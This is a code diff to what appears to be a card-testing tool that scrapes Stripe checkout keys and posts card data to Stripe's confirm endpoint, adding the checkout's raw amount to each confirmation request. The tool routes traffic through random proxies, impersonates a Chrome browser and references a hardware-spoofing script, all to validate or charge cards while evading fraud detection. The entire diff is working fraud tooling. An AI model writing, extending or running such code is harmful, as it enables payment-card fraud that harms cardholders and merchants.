@@ -96,7 +96,7 @@ class StripeAPIExtractor:
                     merchant = resp_json['statement_descriptor']
                     
                 currency = resp_json.get('currency', 'usd').upper()
-                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount else None, 'merchant': merchant}
+                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount else None, 'raw_amount': amount, 'merchant': merchant}
             return {'success': False}
         except: return {'success': False}
 
@@ -484,10 +484,11 @@ HARDWARE_SPOOF_SCRIPT = """
 """
 
 class StripeAPIHitter:
-    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict = None):
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
         self.proxy_data = proxy_data
+        self.raw_amount = raw_amount
         
     async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
         start = time.time()
@@ -542,6 +543,8 @@ class StripeAPIHitter:
                 "key": self.pk_live,
                 "expected_payment_method_type": "card"
             }
+            if self.raw_amount is not None:
+                confirm_data["expected_amount"] = self.raw_amount
             
             confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=15, impersonate="chrome116"))
             confirm_json = confirm_res.json()
@@ -601,6 +604,8 @@ class StripeAPIHitter:
                                         "key": self.pk_live,
                                         "expected_payment_method_type": "card"
                                     }
+                                    if self.raw_amount is not None:
+                                        confirm_data_2["expected_amount"] = self.raw_amount
                                     confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=15, impersonate="chrome116"))
                                     confirm_json_2 = confirm_res_2.json()
                                     
@@ -691,12 +696,13 @@ class ConcurrentHitter:
                     if not pk_key:
                         pk_key = StripeAPIExtractor.extract_pk_live(html)
                         
-                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None}
+                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
                     
                     if cs_token and pk_key:
                         api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
                         if api_data.get('success'):
                             self.url_info['amount'] = api_data.get('amount')
+                            self.url_info['raw_amount'] = api_data.get('raw_amount')
                             self.url_info['merchant'] = api_data.get('merchant')
                     return True
             except Exception as e:
@@ -717,7 +723,7 @@ class ConcurrentHitter:
                 max_retries = 2
                 for try_idx in range(max_retries):
                     proxy_data = await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data)
+                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data, self.url_info.get('raw_amount'))
                     result = await hitter.hit(card, attempt_num, self.user_id)
                     result['amount'] = self.url_info.get('amount')
                     result['merchant'] = self.url_info.get('merchant')
